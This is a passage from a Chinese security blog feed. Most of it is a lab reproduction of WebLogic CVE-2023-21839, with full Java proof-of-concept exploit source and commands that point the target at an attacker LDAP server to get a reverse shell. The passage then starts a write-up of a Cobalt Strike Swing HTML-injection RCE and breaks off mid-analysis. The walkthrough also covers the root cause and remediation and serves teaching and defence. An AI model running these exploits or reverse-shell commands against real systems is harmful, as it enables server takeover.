漏洞原理其实是通过Weblogict3/iiop协议支持远程绑定对象bind到服务端，当远程对象继承自OpaqueReference时，lookup查看远程对象时，服务端调用远程对象getReferent方法，其中的<strong>remoteJNDIName参数可控</strong>，导致攻击者可利用rmi/ldap远程协议进行远程命令执行。</p></blockquote><p>参考📚：</p><blockquote><p>https://www.anquanke.com/post/id/287753</p><p>https://xz.aliyun.com/t/12297</p><p>ChatGPT源码分析：https://www.freebuf.com/vuls/359082.html</p><p>全英文：https://www.pingsafe.com/blog/cve-2023-21839-oracle-weblogic-server-core-patch-advisory</p><p>goby分析+流程图https://www.4hou.com/posts/6x67</p><p>https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md</p><p>https://nosec.org/home/detail/5079.html</p><p>源码追踪</p><p>https://xz.aliyun.com/t/12452</p></blockquote><h3 id="weblogic-t3协议的rmi调用原理">2.1 WeblogicT3协议的RMI调用原理</h3><p>​RMI允许在不同的Java虚拟机（JVM）之间进行通信，使得一个Java程序可以调用另一个Java程序中的方法</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730528.png" alt="RMI实现过程" style="zoom:50%;"></p><p>​</p><p>​ Weblogic RMI默认使用的传输协议是T3，无论是Java RMI还是WeblogicRMI，都需要使用JNDI调用远端的RMI服务。</p><p>​JNDI的查找一般使用lookup()方法。常规Weblogic漏洞在反序列化时触发，流量中的序列化数据没有校验完全，恶意数据被反序列化出Class对象，并调用构造函数，若构造函数里有关于命令执行的指令，远程代码执行即可实现。而本次分析的新漏洞触发在反序列化后的lookup()调用中。</p><p>​<strong><u>CVE-2023-21839漏洞原理</u></strong>：绑定远程对象到服务端JNDI服务后，在客户端执行lookup操作时，如果远程对象为ForeignOpaqueReference，客户端查找时会触发服务端调用ForeignOpaqueReference.getReferent方法，该方法会执行lookup查找，通过可控remoteJNDIName参数构造LDAP服务器可以实现远程命令执行，流程图如下👇🏻</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730529.png" alt="CVE-2023-21839漏洞原理流程图" style="zoom:50%;"></p><p>​</p><h3 id="源码rce利用链">2.2 源码RCE利用链</h3><p>​weblogic.deployment.jms.ForeignOpaqueReference类：继承于OpaqueReference接口，该接口用于在不同的JVM之间通过命名服务传递对象引用。当对象实现此接口，通过lookup检索WLContext时，命名服务会调用getReferent()返回对象。</p><p>​<strong>漏洞入口ForeignOpaqueReference.getReferent</strong>方法源码：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730530.png" alt="漏洞入口getReferent方法部分源码" style="zoom:50%;"></p><p>​1）首先检查JNDI环境，如果没有设置JNDI环境变量，则使用默认的InitialContext对象创建context。否则，则使用指定的this.jndiEnvironment通过InitialContext对象创建context，并检查java.naming.factory.initial属性：该属性指定JNDI实现的工厂类。jndiEnvironment是private属性，可通过反射赋值。</p><p>​ 2）retVal = context.lookup(evalMacros(this.remoteJNDIName));通过远程JNDI名称查找并返回一个对象，然后将其赋值给变量retVal。remoteJNDIName是private属性，<strong>可通过反射赋值</strong></p><p><strong><u>那么构造漏洞利用代码：</u></strong></p><p>​1）创建InitialContext对象，配置JNDI的接口连接Weblogic服务器的环境属性：指定目标服务器的URL地址和初始上下文工厂的实现类。</p><pre><code class="hljs reasonml">Hashtable env = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hashtable()</span>;env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);env.put(Context.PROVIDER_URL, url);InitialContext c = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InitialContext(<span class="hljs-params">env</span>)</span>;</code></pre><p>​2）利用反射赋值ForeignOpaqueReference对象中的jndiEnvironment和remoteJNDIName为LDAP服务器。</p><pre><code class="hljs reasonml">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>); <span class="hljs-comment">//设置java.naming.factory.initial属性</span>Field jndiEnvironment = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ForeignOpaqueReference</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;jndiEnvironment&quot;</span>)</span>;jndiEnvironment.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;jndiEnvironment.set(f, env);  <span class="hljs-comment">//jndiEnvironment赋值</span>Field remoteJNDIName = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ForeignOpaqueReference</span>.</span></span><span class="hljs-keyword">class</span>.getDeclaredField (<span class="hljs-string">&quot;remoteJNDIName&quot;</span>);remoteJNDIName.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;String ldap = <span class="hljs-string">&quot;ldap://xxx &quot;</span>;remoteJNDIName.set(f, ldap); <span class="hljs-comment">//remoteJNDIName赋值</span></code></pre><p>​3）调用InitialContext对象的bind方法将ForeignOpaqueReference对象绑定到JNDI服务，名称随机。</p><pre><code class="hljs reasonml">String bindName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Random(System.<span class="hljs-params">currentTimeMillis</span>()</span>).next<span class="hljs-constructor">Long()</span>+<span class="hljs-string">&quot;&quot;</span>;c.bind(bindName,f);</code></pre><p>​4）最后调用InitialContext对象的lookup方法：c.lookup(bindName)。JNDI服务就会查询绑定对象，触发访问远程LDAP服务器，借此实现远程代码执行。漏洞RCE利用链如下</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730531.png" alt="漏洞利用链" style="zoom:50%;"></p><p>​ 漏洞利用时，配合JNDIExploit工具：JNDI攻击通过引用远程类加载，那么配合工具启动LDAP服务器，将客户端连接到本地LDAP服务器，发送有效载荷。</p><p>​ 该漏洞基于JNDI注入，<strong>由于JDK8u121之后的版本默认com.sun.jndi.ldap.object.trustURLCodebase为false，关闭远程加载类库，无法RMI注入，但可以通过LDAP协议实现JNDI注入</strong>。<strong>而8u191之后的版本LDAP也被禁止，<u>所以Weblogic服务端Java版本过旧时RCE才能实现</u></strong></p><h2 id="漏洞复现">3.漏洞复现</h2><blockquote><p>jndi server利用工具：使用JNDIExploit.jar工具开启LDAP和WEB服务</p><p>https://github.com/WhiteHSBG/JNDIExploit</p><p>保姆级全教程：</p><p>https://bianchengsite.com/u0WeilTZFCR5-t0k6LF7RA</p></blockquote><p>目标机：Centos 7,java8,vps：1.xxx.xxx.172</p><p>搭建环境：</p><p>1.在vps靶机 docker上搭建<strong>Weblogic server12.2.1.3环境</strong>【vulhub搭建的环境】</p><p>​ docker-compose.yml：</p><pre><code class="hljs groovy"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><span class="hljs-attr">services:</span><span class="hljs-attr">weblogic:</span><span class="hljs-attr">image:</span> vulhub/<span class="hljs-attr">weblogic:</span><span class="hljs-number">12.2</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span><span class="hljs-number">-2018</span><span class="hljs-attr">ports:</span>-<span class="hljs-string">&quot;7001:7001&quot;</span></code></pre><p>​ 定位到文件所在位置，终端输入命令</p><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>vulhub-master<span class="hljs-regexp">/weblogic/</span>CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>  <span class="hljs-regexp">//</span>vulhub搭建环境cd CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>docker-compose up -d</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304151753405.png" alt="启动docker环境" style="zoom:50%;"></p><p>2.攻击机访问http://1.xxx.xxx.172:7001/,进入后台http://1.xxx.xxx.172:7001/console/，环境搭建成功</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304151755886.png" alt="docker搭建"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402131803357.png" alt="weblogic环境搭建" style="zoom:50%;"></p><h3 id="poc1">poc1</h3><p>https://github.com/4ra1n/CVE-2023-21839</p><h4 id="漏洞探测">漏洞探测</h4><p>查看DNSlog网站访问记录即可判断漏洞是否存在。</p><p>攻击机运行poc</p><p>【内网docker靶机地址：172.17.0.1】</p><pre><code class="hljs angelscript">./poc2 -ip <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -port <span class="hljs-number">7001</span> -ldap ldap:<span class="hljs-comment">//wpaat8.dnslog.cn</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161716296.png" alt="运行poc" style="zoom:50%;"></p><p>dnslog存在回显，说明存在漏洞：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402131805506.png" alt="image-20240213180551455" style="zoom: 33%;"></p><h4 id="本地利用拿shell">本地利用拿shell</h4><p>目标机：vps上本地docker搭建的weblogic环境，ip：172.17.0.1</p><p>攻击机：vps：1.xxx.xxx.172</p><p>搭建恶意jndiserver，位置：vps</p><blockquote><p>一款用于 <code>JNDI注入</code> 利用的工具，大量参考/引用了<code>Rogue JNDI</code>项目的代码，支持直接<code>植入内存shell</code>，并集成了常见的<code>bypass 高版本JDK</code>的方式，适用于与自动化工具配合使用。</p><p>https://github.com/WhiteHSBG/JNDIExploit</p></blockquote><p>vps运行jdni server，公网开启rmi服务</p><pre><code class="hljs css"><span class="hljs-selector-tag">java</span> <span class="hljs-selector-tag">-jar</span> <span class="hljs-selector-tag">JNDIExploit-1</span><span class="hljs-selector-class">.4-SNAPSHOT</span><span class="hljs-selector-class">.jar</span> <span class="hljs-selector-tag">-i</span> 1<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.172</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161951377.png" alt="开启jndi服务"></p><p><strong>⚠️注意搭建ldapserver的服务器需要开启1389和3456端口，否则无法收到目标机的请求</strong></p><p>vps本地监听5003端口，等待反弹shell</p><pre><code class="hljs angelscript">nc -lvvp <span class="hljs-number">5003</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161724373.png" alt="本地监听5003端口" style="zoom:50%;"></p><p>go编译poc</p><p>go编译设置操作系统为linu【通过GOOS设置编译操作系统，使用GOARCH设置CPU架构，即编译后的二进制文件要在哪个操作系统的哪个CPU架构上运行】</p><pre><code class="hljs routeros">go build -o poc2 【mac】<span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build -o poc2</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161708621.png" alt="go编译poc" style="zoom:50%;"></p><p>运行poc利用,反弹shell</p><pre><code class="hljs angelscript">./poc2 -ip <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -port <span class="hljs-number">7001</span> -ldap ldap:<span class="hljs-comment">//1.xxx.172:1389/Basic/ReverseShell/1.xxx.172/5003</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161953411.png" alt="运行poc"></p><p>ldap服务器收到请求</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161954253.png" alt="ldap服务器" style="zoom:50%;"></p><p>监听端口拿到shell</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161955415.png" alt="getshell" style="zoom:50%;"></p><h3 id="poc2">poc2</h3><p>https://github.com/DXask88MA/Weblogic-CVE-2023-21839</p><p>原始：</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.NamingException;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.Hashtable;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">poc</span> </span>&#123;    <span class="hljs-keyword">static</span> String JNDI_FACTORY=<span class="hljs-string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> InitialContext <span class="hljs-title">getInitialContext</span><span class="hljs-params">(String url)</span><span class="hljs-keyword">throws</span> NamingException</span><span class="hljs-function">    </span>&#123;        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env.put(Context.PROVIDER_URL, url);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InitialContext(env);    &#125;    <span class="hljs-comment">//iiop</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        InitialContext c=getInitialContext(<span class="hljs-string">&quot;t3://172.23.a.b:7001&quot;</span>);        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);        weblogic.deployment.jms.ForeignOpaqueReference f=<span class="hljs-keyword">new</span> weblogic.deployment.jms.ForeignOpaqueReference();        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="hljs-string">&quot;jndiEnvironment&quot;</span>);        jndiEnvironment.setAccessible(<span class="hljs-keyword">true</span>);        jndiEnvironment.set(f,env);        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="hljs-string">&quot;remoteJNDIName&quot;</span>);        remoteJNDIName.setAccessible(<span class="hljs-keyword">true</span>);        remoteJNDIName.set(f,<span class="hljs-string">&quot;ldap://172.23.c.d:1389/Basic/Command/calc&quot;</span>);        c.bind(<span class="hljs-string">&quot;aaa120&quot;</span>,f);        c.lookup(<span class="hljs-string">&quot;aaa120&quot;</span>);    &#125;&#125;</code></pre><p>大佬写的改版的：</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.NamingException;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.Hashtable;<span class="hljs-keyword">import</span> java.util.Random;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CVE_2023_21839</span> </span>&#123;    <span class="hljs-keyword">static</span> String JNDI_FACTORY=<span class="hljs-string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;    <span class="hljs-keyword">static</span> String HOW_TO_USE=<span class="hljs-string">&quot;[*]java -jar 目标ip:端口 ldap地址\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> InitialContext <span class="hljs-title">getInitialContext</span><span class="hljs-params">(String url)</span><span class="hljs-keyword">throws</span> NamingException</span><span class="hljs-function">    </span>&#123;        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env.put(Context.PROVIDER_URL, url);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InitialContext(env);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-keyword">if</span>(args.length &lt;<span class="hljs-number">2</span>)&#123;            System.out.println(HOW_TO_USE);            System.exit(<span class="hljs-number">0</span>);        &#125;        String t3Url = args[<span class="hljs-number">0</span>];        String ldapUrl = args[<span class="hljs-number">1</span>];        InitialContext c=getInitialContext(<span class="hljs-string">&quot;t3://&quot;</span>+t3Url);        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);        weblogic.deployment.jms.ForeignOpaqueReference f=<span class="hljs-keyword">new</span> weblogic.deployment.jms.ForeignOpaqueReference();        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="hljs-string">&quot;jndiEnvironment&quot;</span>);        jndiEnvironment.setAccessible(<span class="hljs-keyword">true</span>);        jndiEnvironment.set(f,env);        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="hljs-string">&quot;remoteJNDIName&quot;</span>);        remoteJNDIName.setAccessible(<span class="hljs-keyword">true</span>);        remoteJNDIName.set(f,ldapUrl);        String bindName = <span class="hljs-keyword">new</span> Random(System.currentTimeMillis()).nextLong()+<span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">try</span>&#123;            c.bind(bindName,f);            c.lookup(bindName);        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123; &#125;    &#125;&#125;</code></pre><p>poc使用方法：</p><p>​编写并打包的EXP利用工具Weblogic-CVE-2023-21839.jar，然后使用<code>java -jar 目标IP:端口 LDAP地址</code></p><h4 id="漏洞探测-1">漏洞探测</h4><p>同理查看DNSlog网站访问记录即可判断漏洞是否存在。</p><p><strong>攻击者要记得使用<code>java8</code>的环境，不然会报错</strong></p><pre><code class="hljs angelscript">java -jar Weblogic-CVE<span class="hljs-number">-2023</span><span class="hljs-number">-21839.</span>jar <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">7001</span> ldap:<span class="hljs-comment">//o712i0.dnslog.cn</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161945367.png" alt="漏洞探测" style="zoom:50%;"></p><h4 id="本地拿shell">本地拿shell</h4><p>攻击机类似前文搭建服jndi服务器，公网服务器centos本地监听5003端口，等待shell连接请求，然后运行如下命令：</p><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar Weblogic-CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>.jar <span class="hljs-number">172.17.0.1:7001</span> ldap://<span class="hljs-number">1</span>.xxx.<span class="hljs-number">172</span>:<span class="hljs-number">1389</span>/Basic/ReverseShell/<span class="hljs-number">1</span>.xxx.<span class="hljs-number">172</span>/<span class="hljs-number">5003</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162004914.png" alt="运行exp" style="zoom:50%;"></p><p>ldap服务器log记录：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162006380.png" alt="ldap服务器记录" style="zoom:50%;"></p><p>攻击机5003端口拿到靶机shell</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162012808.png" alt="getshell" style="zoom:50%;"></p><h2 id="注意事项思考">4.注意事项&amp;思考</h2><ol type="1"><li><strong>⚠️m1适配问题，docker weblogic环境搭建不起来</strong></li></ol><p>​本地测试的话里ldap服务设置的ip地址不要写0.0.0.0，要写公网服务器的IP/内网ip，不然无法获取到LDAP请求，弹shell弹不回来</p><ol start="2" type="1"><li>poc的多目标检测：</li></ol><blockquote><p>https://github.com/4ra1n/CVE-2023-21839/pull/1/commits/f62071a9b93f270f335fc83f8560b8e1f646dc23</p></blockquote><p>poc依赖问题：需导入配置文件wlfullclient.jar，否则无法检测漏洞，先从docker里的weblogic环境下载到本地，也可以直接从网上下载</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">进入vps docker weblogic环境</span>cd /root/vulhub-master/weblogic/CVE-2023-21839docker-compose up -d<span class="hljs-meta">#</span><span class="bash">进入终端【-t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上</span>-i 则让容器的标准输入保持打开】启动一个 bash 终端用来交互  # eac020c1c6XX 你的容器名/编码docker exec -it eac020c1c6XX /bin/bash<span class="hljs-meta">#</span><span class="bash">根据官网指令打包https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html<span class="hljs-comment">#GUID-54815E72-9837-4353-86BB-EA554C9A804D</span></span>java -jar wljarbuilder.jar<span class="hljs-meta">#</span><span class="bash">dockers cp 容器ID:目标路径 本地文件路径  .复制容器内文件到vps本地/root/<span class="hljs-built_in">test</span>下</span>docker cp eac020c1c6XX:/u01/oracle/wlserver/server/lib/wlfullclient.jar /root/test<span class="hljs-meta">#</span><span class="bash">vps下载到本地</span>sz ./wlfullclient.jar</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304211623290.png" alt="依赖包的版本"></p><p>idea导入jar包，点击应用，点击确认，此时，poc依赖配置完毕</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304211644658.png" alt="导入依赖包" style="zoom: 33%;"></p><h2 id="修复方案">5.修复方案</h2><p>1、安装Oracle WebLogic Server最新安全补丁：https://www.oracle.com/security-alerts/cpujan2023.html</p><p>2、关闭T3和iiop协议端口</p><p><strong>漏洞利用T3协议进行攻击，如果程序不依赖T3协议进行JVM通信，通过阻断T3协议防止漏洞攻击是一种有效的防御措施。</strong>具体来说，可以通过以下方法来实现：</p><p>​ (1)禁用不必要的T3协议访问。可以通过配置WebLogicServer控制台来限制T3协议的使用，在base_domain配置页面，连接筛选器只允许特定的IP地址或主机名访问T3协议。</p><p>​(2)加强T3协议的安全性。可以通过加密和身份验证等措施来保护T3协议的安全性，例如使用SSL/TLS协议加密T3协议通信，或者使用用户名和高强度密码进行身份验证</p><p>操作方法参考：https://help.aliyun.com/noticelist/articleid/1060577901.html</p><p>3、IIOP（Internet Inter-ORBProtocol）是一种面向对象的远程过程调用协议，用于在分布式系统中的对象之间进行通信。攻击者也可以利用IIOP协议的漏洞来执行恶意代码。为了防止利用IIOP协议漏洞攻击，可以通过关闭IIOP协议来实现。具体可采取以下措施：</p><p>​(1)禁用IIOP协议：在应用服务器或者中间件中，可以通过配置文件或者管理界面禁用IIOP协议。如Weblogic控制台取消勾选IIOP选项。</p><p>​ (2)配置防火墙：在网络边界处配置防火墙，禁止IIOP协议的流量通过。</p><p>​(3)更新软件版本：及时更新应用服务器或者中间件的软件版本，以修复已知的IIOP协议漏洞。</p><p>​(4)加强访问控制：限制IIOP协议的访问权限，只允许授权的用户或者应用程序使用IIOP协议进行通信。</p><p>4、及时更新WebLogic Server。及时更新WebLogicServer可以修复已知的漏洞，从而避免攻击者利用T3协议进行攻击。</p><h2 id="延伸参考">延伸参考</h2><p>宋雁鸣,步春红.加固中间件WebLogic服务安全[J].网络安全和信息化,2017,No.16(08):117-118.</p><p>周正,孙海波.基于“Weblogic远程代码执行漏洞”谈网络安全问题防范[J].广播电视网络,2021,28(04):56-58.</p><p>Running Oracle WebLogic on containers [O] . Borja Aparicio Cotarelo,Antonio Nappi, Lukas Gedvilas, 2019</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike 存储型XSS-RCE（CVE-2022-39197)</title>
    <link href="/2023/03/15/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0cs/"/>
    <url>/2023/03/15/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0cs/</url>
    
    <content type="html"><![CDATA[<h2 id="cs简介">0.cs简介</h2><p>Cobalt Strike (CS)是一个为对手模拟和红队行动而设计的平台，相当于增强版的Armitage，早期以Metasploit为基础框架，3.0版本之后作为独立平台开发，主要用于目标攻击和模拟后渗透行动。CS集成了端口转发、服务扫描、端口监听、木马生成、钓鱼攻击等功能，可以调用Mimikatz、Psexec等工具，与MSF进行联动，使用插件扩展功能，并且可以利用MalleableC2 profile自定义通信流量特征，是内网大杀器，十分适合作为团队协同攻击工具使用</p><p>Cobalt Strike使用C/S架构，CobaltStrike的客户端连接到团队服务器，团队服务器连接到目标，也就是说CobaltStrike的客户端不与目标服务器进行交互</p><h2 id="漏洞原因">1.漏洞原因</h2><p>由于Cobalt Strike 使用 GUI 框架SWING开发，未经身份验证的远程攻击者可通过在 beacon 元数据中注入恶意 HTML标签，使得CS对其进行解析时加载恶意代码，从而在目标系统上执行任意代码实现rce</p><p>即==》攻击者在Beacon配置中设置格式错误的用户名，借此实现实现远程执行代码</p><p>漏洞危害：</p><p>​ 1.用户获取到使用Cobalt Strike的攻击者的木马样本后，反制正在使用Cobalt Strike 客户端的攻击者</p><p>​ 2.导致命令执行，服务器被入侵</p><p>​ 3.内网被渗透，导致数据被窃取等风险</p><p>影响版本：Cobalt Strike &lt;= 4.7</p><p>修补：</p><p>==》升级版本之后即避免漏洞产生，也可以通过打补丁方式防御漏洞：https://github.com/burpheart/CVE-2022-39197-patch</p><p>启动客户端的时候加入agent参数防止渲染html,具体原理参考后文</p><p>官方通报：</p><p>https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</p><h2 id="漏洞原理">2.漏洞原理</h2><p>参考：</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098978&amp;idx=1&amp;sn=d511d5a674d84eeaf262c8e389ae0403&amp;scene=21#wechat_redirect">漂亮鼠大佬复现</a></p><p><a href="https://www.freebuf.com/vuls/347221.html">最新CSRCE（CVE-2022-39197）复现心得分享</a></p><p>https://cloud.tencent.com/developer/article/2220765</p><p>https://forum.butian.net/share/1934</p><p>https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ?ref=www.ctfiot.com</p><p>https://www.shangyexinzhi.com/article/5240616.html</p><p>https://xz.aliyun.com/t/11815#toc-5</p></blockquote><h3 id="swing的xss漏洞源码分析">2.1 Swing的XSS漏洞源码分析</h3><p>Swing解析HTML标签原理流程：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221647108.png" alt="Swing解析HTML标签流程图" style="zoom:50%;"></p><p>具体解析细节：Swing规定：开头引入<code>&lt;html&gt;</code>标签就会对其中内容进行HTML渲染解析，测试JLabel的setText()方法设置标签内容为HTML代码，能实现在标签中显示图片:</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221650435.png" alt="Swing的HTML特性" style="zoom:50%;"></p><p>​1）分析Swing源码，JDK的运行环境文件rt.jar，分析javax-swing-text-html包，javax代表“Java扩展”</p><p>​2）查看HTML类：定义了一些标签和属性常量。使用HTML标签属性作为参数，实例化多个Tag对象并存储在allTags数组中</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231746185.png" alt="HTML类里定义的标签" style="zoom:50%;"></p><p>​3）HTMLDocument类：定义了一系列标签对应的Action，这些Action用于处理HTML文档中的标签，例如插入图片、插入超链接等</p><p>​4）HTMLEditorKit类：将HTML文本输出为可编辑文本，根据传入的参数（即不同的标签）创建一个对应的HTML元素对象，并将传入的属性和内容设置到该元素对象中。例如，如果传入的标签名是"div"，则该方法会创建一个div元素对象，并将传入的属性和内容设置到该对象中。该方法返回创建的HTML元素对象</p><p>​5）HiddenTagView类：一种特殊的视图对象，用于隐藏标签，如<code>&lt;input type="hidden"&gt;</code>，不会显示在界面中</p><p>​6）HTMLEditorKit类中处理script标签:解析html时，虽然HTML类定义了script标签<strong>但不会执行JavaScript代码</strong>，即并不能引入外部js文件实现常规的Java ScriptXSS（跨站脚本漏洞），而是直接隐藏，不会解析</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221653426.png" alt="HTMLEditorKit类中对script标签的处理" style="zoom:50%;"></p><h3 id="xss到实例化任何类">2.2 XSS到实例化任何类</h3><p>漏洞里实例化任何类入口的源码逻辑图：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221656007.png" alt="实例化任何类入口的源码逻辑" style="zoom:50%;"></p><p>具体研究细节：</p><p>​分析HTML类定义的OBJECT标签和HTMLDocument.HTMLReader定义的ObjectAction。HTMLEditorKit会返回ObjectView类。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231742641.png" alt="HTMLEditorKit类解析不同标签" style="zoom:50%;"></p><p>​</p><p>​ObjectView类：在HTML文档中显示对象，将数据对象呈现为Swing组件。ObjectView尝试加载分类属性指定的object。如果类可以成功加载，将尝试通过调用class.new实例来创建它的实例。即ObjectView是一个用于创建符合特定要求的类实例的工具，它可以通过参数传递来初始化这些实例，<strong>类似反序列化的功能</strong>。<strong><u>那么，通过使用object标签，我们可以实现动态实例化符合要求的类，并通过param标签传递参数，从而实现任意加载</u></strong>。基于这个入口，这种方法不仅可以用于加载图片，还可以应用于实例化任意类的场景。<strong>同时，该类声明了object标签使用模版：</strong></p><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">object</span> classid=&quot;javax.swing.JLabel&quot;&gt;&lt;param <span class="hljs-type">name</span>=&quot;text&quot; <span class="hljs-keyword">value</span>=&quot;sample text&quot;&gt;&lt;/<span class="hljs-keyword">object</span>&gt;</code></pre><p>漏洞入口ObjectView类的部分源码：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231739952.png" 